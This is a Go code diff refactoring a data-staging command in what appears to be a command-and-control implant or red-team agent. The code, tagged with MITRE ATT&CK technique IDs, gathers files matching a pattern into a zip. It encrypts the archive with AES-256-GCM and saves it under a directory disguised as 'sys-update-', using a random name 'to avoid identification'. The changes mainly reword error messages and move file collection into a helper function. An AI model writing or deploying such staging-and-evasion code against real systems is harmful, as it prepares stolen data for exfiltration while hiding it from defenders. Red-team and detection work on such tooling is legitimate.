@@ -23,16 +23,16 @@ import (
 // MITRE ATT&CK: T1074.001 (Local Data Staging), T1560.001 (Archive via Utility)
 func compressStage(task structs.Task, params CompressParams) structs.CommandResult {
 	if params.Path == "" {
-		return errorResult("Error: 'path' is required for stage action")
+		return errorResult("'path' is required for stage action")
 	}
 
 	srcPath, err := filepath.Abs(params.Path)
 	if err != nil {
-		return errorf("Error resolving path: %v", err)
+		return errorf("resolving path: %v", err)
 	}
 
 	if _, err := os.Stat(srcPath); err != nil {
-		return errorf("Error accessing source: %v", err)
+		return errorf("accessing source: %v", err)
 	}
 
 	// Create staging directory
@@ -40,128 +40,44 @@ func compressStage(task structs.Task, params CompressParams) structs.CommandResu
 	if stagingDir == "" {
 		stagingDir, err = os.MkdirTemp("", "sys-update-")
 		if err != nil {
-			return errorf("Error creating staging directory: %v", err)
+			return errorf("creating staging directory: %v", err)
 		}
 	} else {
 		stagingDir, err = filepath.Abs(stagingDir)
 		if err != nil {
-			return errorf("Error resolving staging path: %v", err)
+			return errorf("resolving staging path: %v", err)
 		}
 		if mkErr := os.MkdirAll(stagingDir, 0700); mkErr != nil {
-			return errorf("Error creating staging directory: %v", mkErr)
+			return errorf("creating staging directory: %v", mkErr)
 		}
 	}
 
 	// Generate random archive name to avoid identification
 	randBytes := make([]byte, 8)
 	if _, err := rand.Read(randBytes); err != nil {
-		return errorf("Error generating random name: %v", err)
+		return errorf("generating random name: %v", err)
 	}
 	archiveName := hex.EncodeToString(randBytes) + ".dat"
 	archivePath := filepath.Join(stagingDir, archiveName)
 
-	// Step 1: Create temporary zip in memory-mapped temp file
-	tmpZip, err := os.CreateTemp(stagingDir, ".tmp-")
-	if err != nil {
-		return errorf("Error creating temp file: %v", err)
+	// Step 1: Collect files into a temporary zip archive
+	tmpZipPath, fileCount, totalSize, collectErr := compressStageCollectFiles(task, srcPath, stagingDir, params)
+	if tmpZipPath != "" {
+		defer os.Remove(tmpZipPath)
 	}
-	tmpZipPath := tmpZip.Name()
-	defer os.Remove(tmpZipPath)
-
-	zipWriter := zip.NewWriter(tmpZip)
-	var fileCount int
-	var totalSize int64
-
-	err = filepath.WalkDir(srcPath, func(path string, d fs.DirEntry, walkErr error) error {
-		if task.DidStop() {
-			return fmt.Errorf("cancelled")
-		}
-		if walkErr != nil {
-			return nil // skip inaccessible files
-		}
-		if d.IsDir() {
-			return nil
-		}
-
-		// Check depth
-		relPath, _ := filepath.Rel(srcPath, path)
-		depth := len(strings.Split(relPath, string(os.PathSeparator)))
-		if depth > params.MaxDepth {
-			return nil
-		}
-
-		// Apply pattern filter
-		if params.Pattern != "" {
-			matched, matchErr := filepath.Match(params.Pattern, filepath.Base(path))
-			if matchErr != nil || !matched {
-				return nil
-			}
-		}
-
-		info, err := d.Info()
-		if err != nil {
-			return nil
-		}
-
-		// Check file size
-		if info.Size() > params.MaxSize {
-			return nil
-		}
-
-		// Add to zip
-		relName := filepath.ToSlash(relPath)
-		header, err := zip.FileInfoHeader(info)
-		if err != nil {
-			return nil
-		}
-		header.Name = relName
-		header.Method = zip.Deflate
-
-		writer, err := zipWriter.CreateHeader(header)
-		if err != nil {
-			return nil
-		}
-
-		file, err := os.Open(path)
-		if err != nil {
-			return nil
-		}
-		defer file.Close()
-
-		written, err := io.Copy(writer, file)
-		if err != nil {
-			return nil
-		}
-
-		fileCount++
-		totalSize += written
-		return nil
-	})
-
-	if err != nil {
-		tmpZip.Close()
-		return errorf("Error collecting files: %v", err)
-	}
-
-	if err := zipWriter.Close(); err != nil {
-		tmpZip.Close()
-		return errorf("Error finalizing archive: %v", err)
-	}
-	tmpZip.Close()
-
-	if fileCount == 0 {
-		return errorResult("No files matched the staging criteria")
+	if collectErr != nil {
+		return *collectErr
 	}
 
 	// Step 2: Encrypt the zip archive with AES-256-GCM
 	key := make([]byte, 32) // AES-256
 	if _, err := rand.Read(key); err != nil {
-		return errorf("Error generating encryption key: %v", err)
+		return errorf("generating encryption key: %v", err)
 	}
 
 	plaintext, err := os.ReadFile(tmpZipPath)
 	if err != nil {
-		return errorf("Error reading archive for encryption: %v", err)
+		return errorf("reading archive for encryption: %v", err)
 	}
 
 	// Compute SHA-256 hash of plaintext for integrity verification
@@ -169,12 +85,12 @@ func compressStage(task structs.Task, params CompressParams) structs.CommandResu
 
 	ciphertext, err := encryptAESGCM(key, plaintext)
 	if err != nil {
-		return errorf("Error encrypting archive: %v", err)
+		return errorf("encrypting archive: %v", err)
 	}
 
 	// Write encrypted archive
 	if err := os.WriteFile(archivePath, ciphertext, 0600); err != nil {
-		return errorf("Error writing encrypted archive: %v", err)
+		return errorf("writing encrypted archive: %v", err)
 	}
 
 	// Build staging metadata
@@ -189,13 +105,101 @@ func compressStage(task structs.Task, params CompressParams) structs.CommandResu
 		SourcePath:    srcPath,
 	}
 
-	metadataJSON, _ := json.Marshal(metadata)
-
-	return structs.CommandResult{
-		Output:    string(metadataJSON),
-		Status:    "success",
-		Completed: true,
+	metadataJSON, err := json.Marshal(metadata)
+	if err != nil {
+		return errorf("failed to marshal result: %v", err)
 	}
+
+	return successResult(string(metadataJSON))
+}
+
+// compressStageCollectFiles walks srcPath, collects matching files into a temp zip, and
+// returns the temp file path, file count, total size, and any error result.
+func compressStageCollectFiles(task structs.Task, srcPath, stagingDir string, params CompressParams) (string, int, int64, *structs.CommandResult) {
+	tmpZip, err := os.CreateTemp(stagingDir, ".tmp-")
+	if err != nil {
+		r := errorf("creating temp file: %v", err)
+		return "", 0, 0, &r
+	}
+	tmpZipPath := tmpZip.Name()
+
+	zipWriter := zip.NewWriter(tmpZip)
+	var fileCount int
+	var totalSize int64
+
+	err = filepath.WalkDir(srcPath, func(path string, d fs.DirEntry, walkErr error) error {
+		if task.DidStop() {
+			return fmt.Errorf("cancelled")
+		}
+		if walkErr != nil || d.IsDir() {
+			return nil
+		}
+
+		relPath, _ := filepath.Rel(srcPath, path)
+		depth := len(strings.Split(relPath, string(os.PathSeparator)))
+		if depth > params.MaxDepth {
+			return nil
+		}
+
+		if params.Pattern != "" {
+			matched, matchErr := filepath.Match(params.Pattern, filepath.Base(path))
+			if matchErr != nil || !matched {
+				return nil
+			}
+		}
+
+		info, infoErr := d.Info()
+		if infoErr != nil || info.Size() > params.MaxSize {
+			return nil
+		}
+
+		relName := filepath.ToSlash(relPath)
+		header, headerErr := zip.FileInfoHeader(info)
+		if headerErr != nil {
+			return nil
+		}
+		header.Name = relName
+		header.Method = zip.Deflate
+
+		writer, createErr := zipWriter.CreateHeader(header)
+		if createErr != nil {
+			return nil
+		}
+
+		file, openErr := os.Open(path)
+		if openErr != nil {
+			return nil
+		}
+		defer file.Close()
+
+		written, copyErr := io.Copy(writer, file)
+		if copyErr != nil {
+			return nil
+		}
+
+		fileCount++
+		totalSize += written
+		return nil
+	})
+
+	if err != nil {
+		tmpZip.Close()
+		r := errorf("collecting files: %v", err)
+		return tmpZipPath, 0, 0, &r
+	}
+	if closeErr := zipWriter.Close(); closeErr != nil {
+		tmpZip.Close()
+		r := errorf("finalizing archive: %v", closeErr)
+		return tmpZipPath, 0, 0, &r
+	}
+	tmpZip.Close()
+
+	if fileCount == 0 {
+		r := errorResult("No files matched the staging criteria")
+		return tmpZipPath, 0, 0, &r
+	}
+
+	return tmpZipPath, fileCount, totalSize, nil
 }
 
 // stageMetadata holds the result of a staging operation.
